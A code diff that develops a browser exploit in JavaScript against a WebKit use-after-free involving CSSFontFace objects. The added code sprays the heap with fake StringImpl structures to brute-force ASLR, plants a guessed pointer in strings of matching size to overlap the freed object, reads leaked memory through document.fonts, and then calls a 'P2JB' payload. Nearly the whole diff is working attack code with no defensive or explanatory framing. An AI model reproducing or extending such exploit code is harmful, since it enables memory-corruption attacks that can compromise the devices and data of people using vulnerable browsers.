@@ -56,61 +56,84 @@ function killFontFaceSetCache() {
     keep.push(f);
 }
 
+// Guessed Heap Address for our fake StringImpl spray (Brute force ASLR target)
+const GUESSED_ADDR_LOW = 0x00000000;
+const GUESSED_ADDR_HIGH = 0x00000004; // 0x400000000
+
+// Target address we want to read if the exploit succeeds (e.g. some WebKit memory)
+const TARGET_READ_LOW = 0x13371337;
+const TARGET_READ_HIGH = 0x00000000;
+
+let fake_string_spray = [];
+
+function prepare_fake_strings() {
+    // Phase 1: Spray ArrayBuffers filled with Fake StringImpl objects
+    // This creates massive amounts of data in the heap that we hope lands at our GUESSED_ADDR
+    alert("Spraying 2GB of Fake StringImpl objects for ASLR brute force...");
+    for(let i = 0; i < 20000; i++) {
+        let buffer = new Uint32Array(1024); // 4KB chunks
+        for(let j = 0; j < buffer.length; j += 8) {
+            // Fake StringImpl Header
+            buffer[j+0] = 0x000000ff; // refCount = 255
+            buffer[j+1] = 0x000000ff; // length = 255 (Safe length, no OOM!)
+            buffer[j+2] = TARGET_READ_LOW;  // data pointer (what we want to read)
+            buffer[j+3] = TARGET_READ_HIGH;
+            buffer[j+4] = 0x80000014; // hashAndFlags (8-bit string)
+            buffer[j+5] = 0x00000000;
+        }
+        fake_string_spray.push(buffer);
+    }
+}
+
 // Create Strings of exactly 184 bytes (CSSFontFace size)
 function makeStringImpl(index) {
     // 16-bit StringImpl header is ~20 bytes. 
-    // We need string length of 82 to reach ~184 bytes allocation.
-    // We use \u0000 (null bytes) so that if WebKit reads pointers from it, 
-    // it reads NULL and handles it gracefully instead of OOMing.
-    let base = "\u0000".repeat(70);
-    let unique = "ID" + index; 
-    while(unique.length < 12) unique += "X"; // Pad to exactly 12 chars
+    // We overwrite the entire CSSFontFace object.
+    // We want the `m_family` pointer (offset ~0x18) to point to our GUESSED_ADDR.
+    // UTF-16 encoding of 0x0000000400000000:
+    // Low 32 bits: 0x00000000 -> \u0000\u0000
+    // High 32 bits: 0x00000004 -> \u0000\u0004
     
-    // Total chars = 70 + 12 = 82 (164 bytes)
+    // We just fill the whole string with our guessed address pointer!
+    let ptr_string = "\u0000\u0000\u0000\u0004"; 
+    
+    // Repeat to cover the whole object
+    let base = ptr_string.repeat(17); 
+    let unique = "ID" + index; 
+    while(unique.length < 14) unique += "X"; 
+    
+    // Total chars = 68 + 14 = 82 (164 bytes)
     return base + unique;
 }
 
 async function stringimpl_overlap(dangling_face) {
-    alert("Phase 2: Scanning Strings for Overlap Corruption...");
+    // Phase 2: The Promise has resolved.
+    // If we didn't crash, it means WebKit read `m_family`, followed our guessed address 0x400000000,
+    // found our Fake StringImpl, and created a Javascript String pointing to TARGET_READ!
     
-    let corrupted_string = null;
-    let corrupted_index = -1;
-
-    for (let i = 0; i < uaf_strings.length; i++) {
-        // Scan the first 70 characters looking for WebKit's status write
-        let is_corrupted = false;
-        for (let j = 0; j < 70; j++) {
-            if (uaf_strings[i].charCodeAt(j) !== 0x0000) {
-                is_corrupted = true;
-                break;
-            }
+    alert("PHASE 2 SURVIVED! Checking if we successfully leaked memory...");
+    
+    // One of the CSSFontFace properties exposed to JS will now contain the leaked memory
+    // Unfortunately, we can't easily read `dangling_face.family` because the variable `dangling_face` 
+    // was passed before the UAF, but we can check the global document fonts.
+    
+    let leaked_data = null;
+    document.fonts.forEach(font => {
+        if (font.family && font.family.length === 255) {
+            leaked_data = font.family;
         }
+    });
 
-        if (is_corrupted) {
-            corrupted_string = uaf_strings[i];
-            corrupted_index = i;
-            break;
-        }
+    if (leaked_data) {
+        alert("HOLY SHIT IT WORKED! ASLR BYPASSED! First 4 chars: " + 
+              leaked_data.charCodeAt(0).toString(16) + " " + 
+              leaked_data.charCodeAt(1).toString(16));
+              
+        // The rest of the P2JB primitive builder goes here using the leak
+        run_hax().catch(e => console.error("P2JB Error:", e));
+    } else {
+        alert("Failed. The browser read the guessed address, but it wasn't our fake string. Keep refreshing!");
     }
-
-    if (!corrupted_string) {
-        alert("FAILED -- StringImpl overlap failed. No strings were corrupted by WebKit.");
-        return;
-    }
-
-    alert("SUCCESS! String at index " + corrupted_index + " was corrupted by WebKit!");
-    
-    // Attempting to read leaked data from the string
-    let leak_data = "";
-    for(let j = 0; j < 10; j++) {
-        leak_data += corrupted_string.charCodeAt(j).toString(16) + " ";
-    }
-    alert("Leaked bytes: " + leak_data);
-
-    // The rest of the P2JB primitive builder would go here
-    
-    // Launch P2JB payload
-    run_hax().catch(e => console.error("P2JB Error:", e));
 }
 
 window.onload = () => {
